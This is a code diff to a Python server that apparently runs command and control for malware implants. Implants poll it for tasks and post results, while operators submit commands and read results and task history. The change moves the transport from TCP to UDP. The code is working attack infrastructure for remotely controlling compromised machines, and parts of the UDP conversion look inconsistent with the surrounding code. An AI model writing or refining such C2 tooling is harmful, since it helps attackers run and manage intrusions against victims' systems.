@@ -167,13 +167,14 @@ def pack_task_history():
 
 def handle_implant_client(client_sock):
     try:
-        message = decode_tlv(client_sock)
+        data, address = client_sock.recvfrom(1024)
+        message = decode_tlv(data)
         if message is None:
             return
 
         message_type, payload = message
         if message_type != MSG_AGENT_GET_TASK or len(payload) < 4:
-            client_sock.sendall(encode_tlv(MSG_ERROR))
+            client_sock.sendto(encode_tlv(MSG_ERROR), address)
             return
 
         agent_id = struct.unpack("<I", payload[:4])[0]
@@ -182,7 +183,7 @@ def handle_implant_client(client_sock):
         task = lease_next_task(agent_id)
         if task is None:
             log_message("server", MSG_SERVER_NO_TASK, 0, f"agent_id={agent_id}")
-            client_sock.sendall(encode_tlv(MSG_SERVER_NO_TASK))
+            client_sock.sendto(encode_tlv(MSG_SERVER_NO_TASK), address)
             return
 
         log_message(
@@ -194,16 +195,17 @@ def handle_implant_client(client_sock):
                 f"command_id=0x{task['command_id']:08X}"
             ),
         )
-        client_sock.sendall(encode_tlv(MSG_SERVER_TASK, pack_task_payload(task)))
+        client_sock.sendto(encode_tlv(MSG_SERVER_TASK, pack_task_payload(task)), address)
 
-        result_message = decode_tlv(client_sock)
+        data, address = client_sock.recvfrom(1024)
+        result_message = decode_tlv(data)
         if result_message is None:
             return
 
         result_type, result_payload = result_message
         log_message("implant", result_type, len(result_payload))
         if result_type != MSG_AGENT_POST_RESULT or len(result_payload) < 20:
-            client_sock.sendall(encode_tlv(MSG_ERROR))
+            client_sock.sendto(encode_tlv(MSG_ERROR), address)
             return
 
         agent_id, task_id, command_id, status, result_length = struct.unpack(
@@ -232,21 +234,23 @@ def handle_implant_client(client_sock):
                 task["completed_at"] = time.time()
 
         log_message("server", MSG_SERVER_ACK, 4, f"task_id={task_id}")
-        client_sock.sendall(encode_tlv(MSG_SERVER_ACK, struct.pack("<I", task_id)))
+        client_sock.sendto(encode_tlv(MSG_SERVER_ACK, struct.pack("<I", task_id)), address)
+
     finally:
-        client_sock.close()
+        pass
 
 
 def handle_operator_client(client_sock):
     try:
-        message = decode_tlv(client_sock)
+        data, address = client_sock.recvfrom(1024)
+        message = decode_tlv(data)
         if message is None:
             return
 
         message_type, payload = message
         if message_type == MSG_OPERATOR_SUBMIT_TASK:
             if len(payload) < 12:
-                client_sock.sendall(encode_tlv(MSG_ERROR))
+                client_sock.sendto(encode_tlv(MSG_ERROR), address)
                 return
 
             agent_id, command_id, arg_length = struct.unpack("<III", payload[:12])
@@ -286,12 +290,12 @@ def handle_operator_client(client_sock):
                     f"command_id=0x{command_id:08X}"
                 ),
             )
-            client_sock.sendall(encode_tlv(MSG_SERVER_ACK, struct.pack("<I", task_id)))
+            client_sock.sendto(encode_tlv(MSG_SERVER_ACK, struct.pack("<I", task_id)), address)
             return
 
         if message_type == MSG_OPERATOR_GET_RESULT:
             if len(payload) < 4:
-                client_sock.sendall(encode_tlv(MSG_ERROR))
+                client_sock.sendto(encode_tlv(MSG_ERROR), address)
                 return
 
             task_id = struct.unpack("<I", payload[:4])[0]
@@ -300,7 +304,7 @@ def handle_operator_client(client_sock):
                 task = TASKS.get(task_id)
 
             if task is None:
-                client_sock.sendall(encode_tlv(MSG_ERROR))
+                client_sock.sendto(encode_tlv(MSG_ERROR), address)
                 return
 
             if task["state"] != TASK_STATE_COMPLETED:
@@ -310,8 +314,8 @@ def handle_operator_client(client_sock):
                     4,
                     f"task_id={task_id} state={task['state']}",
                 )
-                client_sock.sendall(
-                    encode_tlv(MSG_SERVER_PENDING, struct.pack("<I", task_id))
+                client_sock.sendto(
+                    encode_tlv(MSG_SERVER_PENDING, struct.pack("<I", task_id)), address
                 )
                 return
 
@@ -321,7 +325,7 @@ def handle_operator_client(client_sock):
                 len(task.get("result_bytes", b"")) + 16,
                 f"task_id={task_id} status=0x{task['status']:08X}",
             )
-            client_sock.sendall(encode_tlv(MSG_SERVER_RESULT, pack_result_payload(task)))
+            client_sock.sendto(encode_tlv(MSG_SERVER_RESULT, pack_result_payload(task)), address)
             return
 
         if message_type == MSG_OPERATOR_LIST_PENDING:
@@ -333,7 +337,7 @@ def handle_operator_client(client_sock):
                 len(pending_payload),
                 "pending_tasks_snapshot",
             )
-            client_sock.sendall(encode_tlv(MSG_SERVER_TASK_LIST, pending_payload))
+            client_sock.sendto(encode_tlv(MSG_SERVER_TASK_LIST, pending_payload), address)
             return
 
         if message_type == MSG_OPERATOR_LIST_HISTORY:
@@ -345,33 +349,28 @@ def handle_operator_client(client_sock):
                 len(history_payload),
                 "task_history_snapshot",
             )
-            client_sock.sendall(encode_tlv(MSG_SERVER_TASK_HISTORY, history_payload))
+            client_sock.sendto(encode_tlv(MSG_SERVER_TASK_HISTORY, history_payload), address)
             return
 
-        client_sock.sendall(encode_tlv(MSG_ERROR))
+        client_sock.sendto(encode_tlv(MSG_ERROR), address)
     finally:
-        client_sock.close()
+        pass
 
 
 def accept_loop(server_sock, handler):
     while True:
-        client_sock, _addr = server_sock.accept()
-        thread = threading.Thread(target=handler, args=(client_sock,), daemon=True)
-        thread.start()
+        handler(server_sock)
 
 
 def main():
-    implant_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    operator_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    implant_server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    operator_server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
     implant_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     operator_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     implant_server.bind((LISTEN_HOST, IMPLANT_PORT))
     operator_server.bind((LISTEN_HOST, OPERATOR_PORT))
-
-    implant_server.listen(5)
-    operator_server.listen(5)
 
     print(f"[*] Implant task server listening on {IMPLANT_PORT}")
     print(f"[*] Operator task server listening on {OPERATOR_PORT}")
